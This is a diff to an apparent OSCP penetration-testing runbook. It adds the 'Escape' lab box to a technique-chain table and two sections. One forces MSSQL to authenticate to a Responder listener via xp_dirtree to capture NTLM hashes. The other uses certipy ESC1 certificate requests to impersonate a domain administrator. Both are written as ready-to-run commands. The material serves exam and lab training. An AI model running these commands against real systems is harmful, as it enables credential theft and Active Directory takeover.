@@ -23,6 +23,7 @@ Use variables from boxstart and boxset. Keep passwords, hashes, keys, cookies, a
 | [[OSCP/BOXES/WRITE UPS/AD/Sauna\|Sauna]] | [[#T01 - Recon and service triage\|T01]] -> [[#T06 - Web fingerprint and content discovery\|T06]] -> [[#T34 - Kerberos AS-REP roasting and Kerberoasting\|T34]] -> [[#T45 - Password cracking and mechanical decoding\|T45]] -> [[#T41 - SMB, WinRM, SSH, and pass-the-hash validation\|T41]] -> [[#T33 - Windows credential artifacts, LSASS, Winlogon, and Credential Manager\|T33]] -> [[#T39 - NTDS, VSS, Backup Operators, and DCSync\|T39]] -> [[#T41 - SMB, WinRM, SSH, and pass-the-hash validation\|T41]] |
 | [[OSCP/BOXES/WRITE UPS/AD/Vintage\|Vintage]] | [[#T01 - Recon and service triage\|T01]] -> [[#T02 - Anonymous SMB, LDAP, and RPC enumeration\|T02]] -> [[#T34 - Kerberos AS-REP roasting and Kerberoasting\|T34]] -> [[#T37 - gMSA password read\|T37]] -> [[#T36 - AD ACL, group membership, and ForceChangePassword\|T36]] -> [[#T38 - RBCD and delegated group abuse\|T38]] -> [[#T33 - Windows credential artifacts, LSASS, Winlogon, and Credential Manager\|T33]] -> [[#T41 - SMB, WinRM, SSH, and pass-the-hash validation\|T41]] |
 | [[OSCP/BOXES/WRITE UPS/AD/Search\|Search]] | [[#T01 - Recon and service triage\|T01]] -> [[#T06 - Web fingerprint and content discovery\|T06]] -> [[#T34 - Kerberos AS-REP roasting and Kerberoasting\|T34]] -> [[#T45 - Password cracking and mechanical decoding\|T45]] -> [[#T41 - SMB, WinRM, SSH, and pass-the-hash validation\|T41]] -> [[#T18 - Source, configuration, backup, and log credential recovery\|T18]] -> [[#T45 - Password cracking and mechanical decoding\|T45]] -> [[#T50 - Client certificate and PowerShell Web Access\|T50]] -> [[#T37 - gMSA password read\|T37]] -> [[#T36 - AD ACL, group membership, and ForceChangePassword\|T36]] -> [[#T41 - SMB, WinRM, SSH, and pass-the-hash validation\|T41]] |
+| [[OSCP/BOXES/WRITE UPS/Windows/Escape\|Escape]] | [[#T01 - Recon and service triage\|T01]] -> [[#T02 - Anonymous SMB, LDAP, and RPC enumeration\|T02]] -> [[#T18 - Source, configuration, backup, and log credential recovery\|T18]] -> [[#T53 - MSSQL xp_dirtree UNC coercion\|T53]] -> [[#T45 - Password cracking and mechanical decoding\|T45]] -> [[#T41 - SMB, WinRM, SSH, and pass-the-hash validation\|T41]] -> [[#T18 - Source, configuration, backup, and log credential recovery\|T18]] -> [[#T41 - SMB, WinRM, SSH, and pass-the-hash validation\|T41]] -> [[#T54 - AD CS ESC1 certificate impersonation\|T54]] -> [[#T41 - SMB, WinRM, SSH, and pass-the-hash validation\|T41]] |
 | [[OSCP/BOXES/WRITE UPS/Linux/Bashed\|Bashed]] | [[#T01 - Recon and service triage\|T01]] -> [[#T06 - Web fingerprint and content discovery\|T06]] -> [[#T20 - Interpreter, header backdoor, and exposed webshell\|T20]] -> [[#T22 - Callback and shell stabilization\|T22]] -> [[#T25 - Linux sudo interpreter and editor abuse\|T25]] -> [[#T27 - Linux cron, systemd, and scheduled-file abuse\|T27]] -> [[#T26 - Linux SUID, capabilities, and privileged binary\|T26]] |
 | [[OSCP/BOXES/WRITE UPS/Linux/Blocky\|Blocky]] | [[#T01 - Recon and service triage\|T01]] -> [[#T06 - Web fingerprint and content discovery\|T06]] -> [[#T08 - CMS, WordPress, Monstra, Magento, or plugin branch\|T08]] -> [[#T19 - JAR, PE, and custom binary analysis\|T19]] -> [[#T18 - Source, configuration, backup, and log credential recovery\|T18]] -> [[#T23 - SSH credentials, keys, passphrases, and password reuse\|T23]] -> [[#T25 - Linux sudo interpreter and editor abuse\|T25]] |
 | [[OSCP/BOXES/WRITE UPS/Linux/Bratarina\|Bratarina]] | [[#T01 - Recon and service triage\|T01]] -> [[#T43 - SMTP, OpenSMTPD, and service-specific RCE\|T43]] -> [[#T21 - Buffer overflow and custom protocol exploit\|T21]] -> [[#T22 - Callback and shell stabilization\|T22]] |
@@ -1136,6 +1137,68 @@ hostname
 ### Open next
 
 Use [[OSCP/RUNBOOK V2/Windows - Privilege Triage|Windows Privilege Triage]], [[OSCP/COMMAND APPENDIX/Windows Privilege Escalation|Windows Privilege Escalation]], and [[OSCP/BOXES/WRITE UPS/Windows/Optimum|Optimum]].
+
+## T53 - MSSQL `xp_dirtree` UNC coercion
+
+### Run this
+
+Start an authorized SMB listener, then use the low-privilege SQL session to make the service resolve a UNC path:
+
+~~~bash
+sudo responder -I tun0 -wv
+~~~
+
+~~~sql
+EXEC master..xp_dirtree '\\$LocalIP\share', 1, 1;
+~~~
+
+Save the captured Net-NTLMv2 response in private loot and crack it offline. Do not confuse it with the NT hash used by pass-the-hash.
+
+### What did you get?
+
+- [ ] Responder captures a service-account response -> **Open [[#T45 - Password cracking and mechanical decoding|T45]], then validate the cracked account with [[#T41 - SMB, WinRM, SSH, and pass-the-hash validation|T41]].**
+- [ ] No response arrives -> **Confirm the SQL login can execute `xp_dirtree`, verify the UNC path and listener interface, and check host reachability.**
+- [ ] `xp_cmdshell` is denied -> **Keep the negative result and continue with `xp_dirtree`; the procedures have separate controls.**
+
+### Open next
+
+Use [[OSCP/COMMAND BREAKDOWNS/SQL Injection (Breakdowns)|SQL Injection breakdowns]] and [[OSCP/RUNBOOK V2/AD - Credential Validation|AD Credential Validation]].
+
+## T54 - AD CS ESC1 certificate impersonation
+
+### Run this
+
+Enumerate vulnerable templates with the recovered domain user:
+
+~~~bash
+certipy find -u "$Username@$Domain" -p "$Password" \
+  -dc-ip "$BoxIP" -vulnerable -stdout \
+  > "$BoxDir/loot/certipy-vulnerable.txt"
+~~~
+
+Before requesting a certificate, confirm that the template allows enrollee-supplied subject, contains client authentication, and grants enrollment to the current user or group.
+
+~~~bash
+certipy req -u "$Username@$Domain" -p "$Password" \
+  -dc-ip "$BoxIP" -ca "$CAName" -template "$Template" \
+  -upn "$AdminUser@$Domain" \
+  > "$BoxDir/loot/certipy-request.txt"
+
+faketime -f "+8h" certipy auth \
+  -pfx "$BoxDir/loot/administrator.pfx" -dc-ip "$BoxIP" \
+  > "$BoxDir/loot/certipy-auth.txt"
+~~~
+
+### What did you get?
+
+- [ ] Template has all ESC1 conditions -> **Request the evidence-backed target UPN and authenticate the returned PFX under the correct clock.**
+- [ ] Request is denied -> **Check CA name, template name, enrollment ACL, UPN, and clock skew before retrying once.**
+- [ ] Authentication returns an NT hash -> **Validate it with [[#T41 - SMB, WinRM, SSH, and pass-the-hash validation|T41]], then use the correct remote shell.**
+- [ ] No client-authentication EKU or no subject control -> **Do not force ESC1. Return to [[#T36 - AD ACL, group membership, and ForceChangePassword|T36]] or [[#T39 - NTDS, VSS, Backup Operators, and DCSync|T39]].**
+
+### Open next
+
+Use [[OSCP/RUNBOOK V2/AD - Certificate Services ESC1|AD Certificate Services ESC1]], [[OSCP/RUNBOOK V2/AD - Clock Sync|AD Clock Sync]], and [[OSCP/BOXES/WRITE UPS/Windows/Escape|Escape]].
 
 ## T49 - Cleanup and closeout after a scenario branch
 
